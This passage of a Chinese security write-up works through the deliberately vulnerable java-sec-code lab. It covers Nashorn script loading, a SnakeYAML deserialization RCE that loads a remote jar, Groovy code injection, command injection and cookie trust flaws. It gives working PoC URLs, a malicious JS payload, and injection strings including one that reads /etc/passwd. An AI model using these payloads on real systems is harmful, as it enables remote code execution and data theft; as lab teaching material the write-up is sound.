class="hljs-title function_">jsEngine</span><span class="hljs-params">(String jsurl)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <span class="hljs-comment">// 接收jsurl参数</span><br>    <span class="hljs-comment">// 获取JavaScript引擎（Nashorn）</span><br>    <span class="hljs-type">ScriptEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ScriptEngineManager</span>().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>);    <br>    <span class="hljs-comment">// 获取当前引擎的作用域绑定</span><br>    <span class="hljs-type">Bindings</span> <span class="hljs-variable">bindings</span> <span class="hljs-operator">=</span> engine.getBindings(ScriptContext.ENGINE_SCOPE);    <br>    <span class="hljs-comment">// 构造加载远程JS的命令</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;load(\&quot;%s\&quot;)&quot;</span>, jsurl);    <br>    <span class="hljs-comment">// 执行加载命令</span><br>    engine.eval(cmd, bindings);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>直接使用用户输入的<code>jsurl</code>构造<code>load()</code>命令</li><li><strong>无任何安全过滤</strong></li></ul><p><strong>漏洞利用：</strong></p><p>因为是基于Java的Nashorn JavaScript引擎，接受一个<strong>外部JS文件URL</strong>（<code>jsurl</code>），然后通过<code>load()</code>函数去加载执行远程的JS代码，如果远程JS包含恶意代码（比如调用Java的<code>Runtime.exec</code>执行系统命令），就会造成远程命令执行（RCE）漏洞。</p><p>先编写一个恶意的JS文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// zz.js</span><br><span class="hljs-keyword">var</span> a = <span class="hljs-title function_">mainOutput</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">mainOutput</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// Windows打开计算器命令</span><br>    <span class="hljs-keyword">var</span> cmd = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br>    <span class="hljs-comment">// 执行系统命令</span><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Runtime</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">type</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br>    <span class="hljs-title class_">Runtime</span>.<span class="hljs-title function_">getRuntime</span>().<span class="hljs-title function_">exec</span>(cmd);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927399.png" alt="20250722150342733"></p><p>放入C盘</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927712.png" alt="20250722150411441"></p><p>用Python自带的简易HTTP服务器快速启动</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> C:\malicious<br>python -m http.server <span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927851.png" alt="20250722150542190"></p><p>现在本地就有了一个HTTP服务器，远程JS脚本的URL就是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8000/zz.js<br></code></pre></td></tr></table></figure><p>POC：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/rce/</span>jscmd?jsurl=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8000</span>/zz.js<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080927894.png" alt="20250722150709404"></p><p>HTTP访问日志：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928094.png" alt="20250722150740046"></p><h4 id="4-vuln-yarm"><a href="#4-vuln-yarm" class="headerlink" title="4.&#x2F;vuln&#x2F;yarm"></a>4.&#x2F;vuln&#x2F;yarm</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/vuln/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-comment">//使用默认构造方法创建一个 SnakeYAML 的解析器。这个构造器会使用默认的 Constructor，允许加载 Java 对象，存在安全风险。</span><br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br>    <span class="hljs-comment">//这里把传入的 content 作为 YAML 输入进行解析，如果内容里构造了特殊的 Java 对象，就可能会被反序列化并执行代码，形成 RCE</span><br>    y.load(content);<br>&#125;<br><br><span class="hljs-meta">@GetMapping(&quot;/sec/yarm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">secYarm</span><span class="hljs-params">(String content)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<br>    y.load(content);<br>&#125;<br></code></pre></td></tr></table></figure><p> <strong>YAML 反序列化漏洞</strong> ,利用 SnakeYAML 默认构造器（反序列化）+ JDK 类加载机制，达到远程代码执行（RCE） 的攻击。</p><p>攻击核心点在于：</p><blockquote><p><strong>构造 ScriptEngineManager 并传入一个远程 URLClassLoader，从而触发恶意类加载或脚本执行。</strong></p><p>SnakeYaml反序列化漏洞研究:<a href="https://www.cnblogs.com/LittleHann/p/17828948.html">https://www.cnblogs.com/LittleHann/p/17828948.html</a></p></blockquote><p>这是源码中作者给出的一个poc</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22</span>]]]]<br><br></code></pre></td></tr></table></figure><p>yaml-payload.jar:<a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>下载好后开始打包为 jar：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">javac <span class="hljs-attribute">src</span>/artsploit/AwesomeScriptEngineFactory<span class="hljs-selector-class">.java</span> <br><br>jar -cvf yaml-payload<span class="hljs-selector-class">.jar</span> -C <span class="hljs-attribute">src</span>/ .<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928242.png" alt="20250722153817282"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928271.png" alt="20250722153829103"></p><p>将打包好的文件  yaml-payload.jar 放入服务器文件夹，开启HTTP</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929506.png" alt="20250722154012661"></p><p>触发漏洞：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1:8081/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20</span>[<span class="hljs-string">!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://localhost:8000/yaml-payload.jar%22</span>]]]]<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080928486.png" alt="20250722155011777"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929891.png" alt="20250722155022447"></p><h4 id="5-groovy"><a href="#5-groovy" class="headerlink" title="5.groovy"></a>5.groovy</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;groovy&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">groovyshell</span><span class="hljs-params">(String content)</span> &#123;<br>       <span class="hljs-comment">//GroovyShell 是 Groovy 提供的脚本解释器，可以在 Java 程序中动态执行 Groovy 代码</span><br>       <span class="hljs-type">GroovyShell</span> <span class="hljs-variable">groovyShell</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GroovyShell</span>();<br>       <span class="hljs-comment">//将用户传入的脚本内容作为 Groovy 代码,立即执行</span><br>       groovyShell.evaluate(content);<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">rce/groovy?<span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;calc&quot;</span>.execute()<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929076.png" alt="20250722155651468"></p><h2 id="命令注入-Cmd-Inject"><a href="#命令注入-Cmd-Inject" class="headerlink" title="命令注入-Cmd Inject"></a>命令注入-Cmd Inject</h2><p>源码位置：src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;CommandInject.java</p><h3 id="1-codeinject"><a href="#1-codeinject" class="headerlink" title="1.&#x2F;codeinject"></a>1.&#x2F;codeinject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/codeinject&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInject</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<span class="hljs-comment">//GET 请求，接收 filepath 参数</span><br>        <span class="hljs-comment">//String[] cmdList = new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, <span class="hljs-string">&quot;dir &quot;</span> + filepath&#125;;<span class="hljs-comment">//启动 cmd ，/c 执行后关闭终端，dir filepath 列出指定路径下的文件和目录；此处直接拼接了用户输入，存在 RCE 漏洞。</span><br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<span class="hljs-comment">//使用上面构建的命令数组创建进程</span><br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<span class="hljs-comment">//将标准错误流（stderr）合并到标准输出流（stdout），方便统一读取</span><br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<span class="hljs-comment">//启动进程，执行命令</span><br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<span class="hljs-comment">//获取命令执行后的标准输出流</span><br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ProcessBuilder</span><span class="hljs-params">(String... command)</span> &#123;<br>        <span class="hljs-built_in">this</span>.command = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;(command.length);<br>        <span class="hljs-keyword">for</span> (String arg : command)<br>            <span class="hljs-built_in">this</span>.command.add(arg);<br>    &#125;<br>    <br> <span class="hljs-keyword">public</span> ProcessBuilder <span class="hljs-title function_">redirectErrorStream</span><span class="hljs-params">(<span class="hljs-type">boolean</span> redirectErrorStream)</span> &#123;<br>        <span class="hljs-built_in">this</span>.redirectErrorStream = redirectErrorStream;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>calc.exe<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>ipconfig<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=.%<span class="hljs-number">26</span>whoami<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/codeinject?filepath=%<span class="hljs-number">7</span>Cwhoami<br></code></pre></td></tr></table></figure><ul><li>注意将符号进行 url 编码<ul><li>&amp; - .%26 - 拼接cmd命令</li><li>| - %7C - 执行多条命令</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929661.png" alt="20250723130014199"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929041.png" alt="20250723130045224"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080929093.png" alt="20250723130103166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080930759.png" alt="20250723130116070"></p><p>Linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:8080/codeinject?filepath=/tmp;<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h3 id="2-codeinject-host"><a href="#2-codeinject-host" class="headerlink" title="2.&#x2F;codeinject&#x2F;host"></a>2.&#x2F;codeinject&#x2F;host</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/host&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectHost</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;host&quot;</span>);<br>        logger.info(host);<br>        String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;curl &quot;</span> + host&#125;;<br>        <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>        builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>        <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>注入参数为http请求头中的host参数，将host参数修改为 <code>payload：localhost&amp;ipconfig</code>，执行命令</p><p>BUG: Codeinject的host部分由于pom.xml更新了tomcat 版本导致打不通:</p><p><a href="https://github.com/JoyChou93/java-sec-code/issues/78">https://github.com/JoyChou93/java-sec-code/issues/78</a></p><h3 id="3-codeinject-sec"><a href="#3-codeinject-sec" class="headerlink" title="3.&#x2F;codeinject&#x2F;sec"></a>3.&#x2F;codeinject&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/codeinject/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">codeInjectSec</span><span class="hljs-params">(String filepath)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">filterFilePath</span> <span class="hljs-operator">=</span> SecurityUtil.cmdFilter(filepath);<span class="hljs-comment">//调用了自定义的安全类</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == filterFilePath) &#123;<span class="hljs-comment">//如果 cmdFilter 方法返回 null ，进行拦截</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bad boy. I got u.&quot;</span>;<br>    &#125;<br>    String[] cmdList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ls -la &quot;</span> + filterFilePath&#125;;<span class="hljs-comment">//Linux 下的 shell 命令</span><br>    <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdList);<br>    builder.redirectErrorStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> builder.start();<br>    <span class="hljs-keyword">return</span> WebUtils.convertStreamToString(process.getInputStream());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityUtil</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Pattern</span> <span class="hljs-variable">FILTER_PATTERN</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(SecurityUtil.class);<br><br>...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">cmdFilter</span><span class="hljs-params">(String input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!FILTER_PATTERN.matcher(input).matches()) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> input;<br>    &#125;<br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p><code>&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</code>:</p><ul><li><p><code>^</code> 和 <code>$</code>：表示整个字符串必须从头到尾都符合中间的规则。</p></li><li><p><code>[a-zA-Z0-9_/\\.-]+</code>：</p><ul><li><p><code>a-zA-Z0-9</code>：大小写字母和数字</p></li><li><p><code>_</code>：允许下划线</p></li><li><p><code>/</code>：允许正斜杠（路径分隔符）</p></li><li><p><code>.</code>：允许点号（如隐藏文件、扩展名）</p></li><li><p><code>-</code>：允许减号</p></li></ul></li></ul><p>可以过滤的威胁：</p><ul><li><code>;</code>, <code>&amp;</code>, <code>|</code>, <code>$</code>, <code>\</code>（除路径分隔符）, <code>*</code>, 空格、换行、引号等</li></ul><h2 id="cookies越权"><a href="#cookies越权" class="headerlink" title="cookies越权"></a>cookies越权</h2><p>src&#x2F;main&#x2F;java&#x2F;org&#x2F;joychou&#x2F;controller&#x2F;Cookies.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> org.joychou.controller;<br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.CookieValue;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.Cookie;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><br><span class="hljs-keyword">import</span> org.joychou.util.WebUtils;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.springframework.web.util.WebUtils.getCookie;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 某些应用获取用户身份信息可能会直接从cookie中直接获取明文的nick或者id，导致越权问题。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/cookie&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cookies</span> &#123;<br><br>    <span class="hljs-comment">//表示 Cookie 中用于表示用户昵称的键</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">NICK</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;nick&quot;</span>;<br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln01&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln01</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-comment">//调用 getCookieValueByName 方法获取 cookie 中的 nick 值</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> WebUtils.getCookieValueByName(req, NICK); <span class="hljs-comment">// key code</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static String getCookieValueByName(HttpServletRequest request, String cookieName) &#123;</span><br><span class="hljs-comment">        Cookie cookie = org.springframework.web.util.WebUtils.getCookie(request, cookieName);</span><br><span class="hljs-comment">        return cookie == null ? null : cookie.getValue();</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"> */</span><br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln02</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie[] cookie = req.getCookies();<br><br>        <span class="hljs-keyword">if</span> (cookie != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">//调用 getCookie 方法获取 cookie 中的 nick 值</span><br>            nick = getCookie(req, NICK).getValue();  <span class="hljs-comment">// key code</span><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Cookie nick: &quot;</span> + nick;<br>    &#125;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    public class WebUtils &#123;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    public static Cookie getCookie(HttpServletRequest request, String name) &#123;</span><br><span class="hljs-comment">        Assert.notNull(request, &quot;Request must not be null&quot;);</span><br><span class="hljs-comment">        Cookie[] cookies = request.getCookies();</span><br><span class="hljs-comment">        if (cookies != null) &#123;</span><br><span class="hljs-comment">            for(Cookie cookie : cookies) &#123;</span><br><span class="hljs-comment">                if (name.equals(cookie.getName())) &#123;</span><br><span class="hljs-comment">                    return cookie;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        return null;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    </span><br><span class="hljs-comment">    */</span><br>    <br><br><br>    <span class="hljs-meta">@GetMapping(value = &quot;/vuln03&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">vuln03</span><span class="hljs-params">(HttpServletRequest req)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">nick</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        Cookie cookies[] = req.getCookies();<br>        <span class="hljs-keyword">if</span> (cookies != <span 